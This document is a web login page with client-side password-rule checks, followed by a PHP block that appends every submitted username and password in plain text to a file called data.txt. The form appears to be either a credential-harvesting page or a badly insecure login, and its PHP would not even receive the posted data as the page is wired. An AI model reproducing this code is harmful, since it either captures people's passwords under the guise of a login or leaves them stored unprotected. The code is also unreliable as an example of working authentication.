<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8"> 
    <link rel="stylesheet" href="../cssFiles/logincss.css">
    <title>Login</title>
  </head>
<body>
<a class="home" href="../index.html" style="color: black">Home</a>
<br>
<br>
<br>
<br>
<div class="container">
  <h1> "Welcome Back!" </h1>
  <form action="home.html" method="POST">
  <!--action="/action_page.php">-->
    <label for="usrname">Username/E-Mail Address</label>
    <input type="text" id="usrname" name="usrname" required>
    <label for="psw">Password</label>
    <input type="password" id="psw" name="psw" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Must contain at least one number and one uppercase and lowercase letter, and at least 8 or more characters" required>
    <input type="submit" value="Login">
    <!--<input type="submit" value="Does Not Have An Account? Register Now!">-->
    <a href="../pages/registration.html">Does Not Have An Account? Register Now!</a>
  </form>
</div>

<div id="message">
  <h3>Password must contain the following:</h3>
  <p id="letter" class="invalid">A <b>lowercase</b> letter</p>
  <p id="capital" class="invalid">A <b>capital (uppercase)</b> letter</p>
  <p id="number" class="invalid">A <b>number</b></p>
  <p id="length" class="invalid">Minimum <b>8 characters</b></p>
</div>
				
<script>
var myInput = document.getElementById("psw");
var letter = document.getElementById("letter");
var capital = document.getElementById("capital");
var number = document.getElementById("number");
var length = document.getElementById("length");

// When the user clicks on the password field, show the message box
myInput.onfocus = function() {
  document.getElementById("message").style.display = "block";
}

// When the user clicks outside of the password field, hide the message box
myInput.onblur = function() {
  document.getElementById("message").style.display = "none";
}

// When the user starts to type something inside the password field
myInput.onkeyup = function() {
  // Validate lowercase letters
  var lowerCaseLetters = /[a-z]/g;
  if(myInput.value.match(lowerCaseLetters)) {  
    letter.classList.remove("invalid");
    letter.classList.add("valid");
  } else {
    letter.classList.remove("valid");
    letter.classList.add("invalid");
  }
  
  // Validate capital letters
  var upperCaseLetters = /[A-Z]/g;
  if(myInput.value.match(upperCaseLetters)) {  
    capital.classList.remove("invalid");
    capital.classList.add("valid");
  } else {
    capital.classList.remove("valid");
    capital.classList.add("invalid");
  }

  // Validate numbers
  var numbers = /[0-9]/g;
  if(myInput.value.match(numbers)) {  
    number.classList.remove("invalid");
    number.classList.add("valid");
  } else {
    number.classList.remove("valid");
    number.classList.add("invalid");
  }
  
  // Validate length
  if(myInput.value.length >= 8) {
    length.classList.remove("invalid");
    length.classList.add("valid");
  } else {
    length.classList.remove("valid");
    length.classList.add("invalid");
  }
}
</script>

</body>
</html>


<?php
              
if(isset($_POST['usrname']))
{
$data=$_POST['usrname'] . "\n";
$fp = fopen('data.txt', 'a');
fwrite($fp, $data);
fclose($fp);
}

if(isset($_POST['psw']))
{
$data=$_POST['psw'] . "\n";
$fp = fopen('data.txt', 'a');
fwrite($fp, $data);
fclose($fp);
}

?>